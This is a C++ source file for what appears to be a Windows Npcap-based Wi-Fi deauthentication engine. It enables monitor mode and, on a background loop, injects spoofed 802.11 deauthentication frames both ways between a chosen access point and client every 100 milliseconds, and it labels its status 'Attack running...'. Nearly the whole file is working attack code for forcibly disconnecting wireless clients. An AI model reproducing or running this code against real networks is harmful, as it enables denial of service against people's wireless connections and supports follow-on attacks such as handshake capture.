// src/RawDeauthEngine.cpp
#include "RawDeauthEngine.h"
#include <iostream>
#include <chrono>

RawDeauthEngine::RawDeauthEngine() : m_pcapHandle(nullptr), m_initialized(false), m_statusMsg("Not initialized") {
}

RawDeauthEngine::~RawDeauthEngine() {
    shutdown();
}

void RawDeauthEngine::setStatus(const std::string& status) {
    std::lock_guard<std::mutex> lock(m_statusMutex);
    m_statusMsg = status;
}

std::string RawDeauthEngine::getStatus() const {
    std::lock_guard<std::mutex> lock(m_statusMutex);
    return m_statusMsg;
}

bool RawDeauthEngine::parseMac(const std::string& macStr, uint8_t outMac[6]) {
    int values[6];
    if (sscanf_s(macStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
        &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; ++i) outMac[i] = (uint8_t)values[i];
        return true;
    }
    return false;
}

bool RawDeauthEngine::initialize(const std::string& adapterName) {
    if (m_initialized) return true;
    m_adapterName = adapterName;
    
    char errbuf[PCAP_ERRBUF_SIZE];
    
    // We must use pcap_create and pcap_set_rfmon to enable Monitor Mode
    pcap_t* handle = pcap_create(m_adapterName.c_str(), errbuf);
    if (!handle) {
        setStatus("Failed to create pcap handle: " + std::string(errbuf));
        return false;
    }
    
    // Request monitor mode before activating
    if (pcap_set_rfmon(handle, 1) != 0) {
        setStatus("WARNING: Monitor mode not directly supported by Npcap on this adapter interface.");
        // We will continue anyway, as some adapters need the specific Wi-Fi Native sub-interface, 
        // or they might just inject without full capture rfmon.
    }
    
    pcap_set_snaplen(handle, 65536);
    pcap_set_promisc(handle, 1);
    pcap_set_timeout(handle, 10);
    
    if (pcap_activate(handle) != 0) {
        setStatus("Failed to activate pcap handle for raw injection.");
        pcap_close(handle);
        return false;
    }
    
    m_pcapHandle = handle;
    m_initialized = true;
    setStatus("Initialized properly.");
    
    // Start background loop
    m_loopRunning = true;
    m_deauthThread = std::thread(&RawDeauthEngine::deauthLoop, this);
    
    return true;
}

void RawDeauthEngine::shutdown() {
    m_loopRunning = false;
    if (m_deauthThread.joinable()) {
        m_deauthThread.join();
    }
    
    m_initialized = false;
    if (m_pcapHandle) {
        pcap_close(m_pcapHandle);
        m_pcapHandle = nullptr;
    }
    
    std::lock_guard<std::mutex> lock(m_jobsMutex);
    m_jobs.clear();
    setStatus("Offline");
}

void RawDeauthEngine::startDeauth(const std::string& bssid, const std::string& clientMac) {
    std::lock_guard<std::mutex> lock(m_jobsMutex);
    DeauthJob job;
    job.bssid = bssid;
    job.client_mac = clientMac;
    job.active = true;
    job.packets_sent = 0;
    
    m_jobs[clientMac] = job;
    setStatus("Attack running...");
}

void RawDeauthEngine::stopDeauth(const std::string& clientMac) {
    std::lock_guard<std::mutex> lock(m_jobsMutex);
    auto it = m_jobs.find(clientMac);
    if (it != m_jobs.end()) {
        it->second.active = false;
        m_jobs.erase(it);
    }
    if (m_jobs.empty()) setStatus("Idle");
}

void RawDeauthEngine::stopAllDeauth() {
    std::lock_guard<std::mutex> lock(m_jobsMutex);
    m_jobs.clear();
    setStatus("Idle");
}

std::vector<DeauthJob> RawDeauthEngine::getActiveJobs() const {
    std::lock_guard<std::mutex> lock(m_jobsMutex);
    std::vector<DeauthJob> result;
    for (const auto& kv : m_jobs) {
        if (kv.second.active) {
            result.push_back(kv.second);
        }
    }
    return result;
}

void RawDeauthEngine::sendDeauthPkt(pcap_t* handle, const uint8_t bssid[6], const uint8_t client_mac[6]) {
    if (!handle) return;
    
    uint8_t packet[128];
    memset(packet, 0, sizeof(packet));
    
    size_t offset = 0;
    
    // 1. Radiotap Header
    RadiotapHeader* rth = (RadiotapHeader*)(packet + offset);
    rth->it_version = 0;
    rth->it_pad = 0;
    rth->it_len = sizeof(RadiotapHeader);
    rth->it_present = 0;
    offset += sizeof(RadiotapHeader);
    
    // 2. 802.11 MAC Header (Deauth: Type 0 (Mgmt), Subtype 12 (0x0C) -> 0xC0 Frame control)
    Dot11MacHeader* mac = (Dot11MacHeader*)(packet + offset);
    mac->frame_control[0] = 0xC0; // Deauthentication
    mac->frame_control[1] = 0x00;
    mac->duration_id = 0x013A;    // ~314 microseconds duration
    
    // To Client from AP
    memcpy(mac->addr1, client_mac, 6); // Dest (Client)
    memcpy(mac->addr2, bssid, 6);      // Src (AP)
    memcpy(mac->addr3, bssid, 6);      // BSSID (AP)
    mac->seq_ctrl = 0;
    offset += sizeof(Dot11MacHeader);
    
    // 3. Deauth Body Phase
    Dot11DeauthBody* body = (Dot11DeauthBody*)(packet + offset);
    body->reason_code = 0x0007; // Reason 7: Class 3 frame received from nonassociated station
    offset += sizeof(Dot11DeauthBody);
    
    // Inject packet: AP to Client
    pcap_sendpacket(handle, packet, offset);
    
    // Invert for bi-directional deauth: Client to AP
    memcpy(mac->addr1, bssid, 6);      // Dest (AP)
    memcpy(mac->addr2, client_mac, 6); // Src (Client)
    
    // Inject packet: Client to AP
    pcap_sendpacket(handle, packet, offset);
}

void RawDeauthEngine::deauthLoop() {
    while (m_loopRunning) {
        
        std::vector<DeauthJob> jobsToProcess;
        {
            std::lock_guard<std::mutex> lock(m_jobsMutex);
            for (auto& kv : m_jobs) {
                if (kv.second.active) {
                    jobsToProcess.push_back(kv.second);
                }
            }
        }
        
        if (jobsToProcess.empty()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }
        
        for (const auto& job : jobsToProcess) {
            uint8_t parsedBssid[6] = {0};
            uint8_t parsedClient[6] = {0};
            
            if (parseMac(job.bssid, parsedBssid) && parseMac(job.client_mac, parsedClient)) {
                sendDeauthPkt(m_pcapHandle, parsedBssid, parsedClient);
                
                // Update stats safely
                std::lock_guard<std::mutex> lock(m_jobsMutex);
                auto it = m_jobs.find(job.client_mac);
                if (it != m_jobs.end()) {
                    it->second.packets_sent += 2; // Sent 2 packets (AP->Client & Client->AP)
                }
            }
        }
        
        // Match Python script _DEAUTH_INTV = 0.100  # 100[ms]
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}
